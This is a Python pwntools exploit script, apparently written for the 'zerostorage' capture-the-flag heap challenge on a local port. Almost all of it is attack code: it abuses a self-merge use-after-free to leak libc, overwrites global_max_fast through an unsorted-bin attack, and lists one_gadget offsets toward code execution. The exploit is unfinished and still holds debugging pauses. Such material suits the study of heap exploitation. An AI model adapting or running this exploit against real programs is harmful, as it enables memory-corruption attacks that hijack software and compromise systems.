#!/usr/bin/env python3

from pwn import *

class ProbIO:
    MENU_START = '== Zero Storage =='
    MENU_END = '=================='

    def __init__(self, r):
        self.r = r
        self.sla = lambda t, x: self.r.sendlineafter(t, x)
        self.sa = lambda t, x: self.r.sendafter(t, x)

    def sel1(self, length, data):
        self.sla(":", str(1))
        self.sla(":", str(length))
        self.sa(":", data)

    def sel2(self, _id, length, data):
        self.sla(":", str(2))
        self.sla(":", str(_id))
        self.sla(":", str(length))
        self.sa(":", data)

    def sel3(self, _from, _to):
        self.sla(":", str(3))
        self.sla(":", str(_from))
        self.sla(":", str(_to))

    def sel4(self, _id):
        self.sla(":", str(4))
        self.sla(":", str(_id))

    def sel5(self, _id):
        self.sla(":", str(5))
        self.sla(":", str(_id))

    def sel6(self):
        self.sla(":", str(6))
        print(self.r.recvuntil(self.MENU_START))

class Primitives:

    def __init__(self, io, e):
        self.io = io
        self.e = e

    def insert(self, *args, **kwargs): return self.io.sel1(*args, **kwargs)
    def update(self, *args, **kwargs): return self.io.sel2(*args, **kwargs)
    def merge(self, *args, **kwargs): return self.io.sel3(*args, **kwargs)
    def delete(self, *args, **kwargs): return self.io.sel4(*args, **kwargs)
    def view(self, *args, **kwargs): return self.io.sel5(*args, **kwargs)
    def list(self, *args, **kwargs): return self.io.sel6(*args, **kwargs)

    def leak(self):
        self.view(2)
        self.io.r.recvline()
        leak1 = u64(self.io.r.recvn(8))
        libc = u64(self.io.r.recvn(8)) - (0x3c4b20 + 88)
        log.warn(f"libc found: {hex(libc)}")
        assert (libc & 0xfff) == 0x0
        return leak1, libc

def exploit(io, pri):
    pri.insert(0x20, "A" * 0x20)
    pri.insert(0x98, "B" * 0x98)
    pri.insert(0x20, "C" * 0x20)
    pri.insert(0x20, "D" * 0x20)
    pri.insert(0x2f0, "E" * 0x2f0)
    pri.insert(0x20, "F" * 0x20)
    pri.delete(2)
    pri.merge(0, 0)
    leak1, libc = pri.leak()

    _global_max_fast = 0x3c67f8
    payload = p64(leak1)
    payload += p64(libc + _global_max_fast - 0x10)
    pri.update(2, len(payload), payload) # Set to global_max_fast as `main_arena + 88`
    pause()
    pri.insert(0x20, "G" * 0x20) # Overwrite here!
    pri.insert(0x20, "H" * 0x20)

    pri.delete(2)
    pri.delete(0)
    pri.delete(6)
    pause()

    _one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]


def main(r, e, l):
    io = ProbIO(r)
    pri = Primitives(io, e)
    exploit(io, pri)
    r.interactive()

if __name__ == "__main__":
    r = remote("127.0.0.1", 9929)
    e = ELF("./zerostorage")
    l = None
    main(r, e, l)
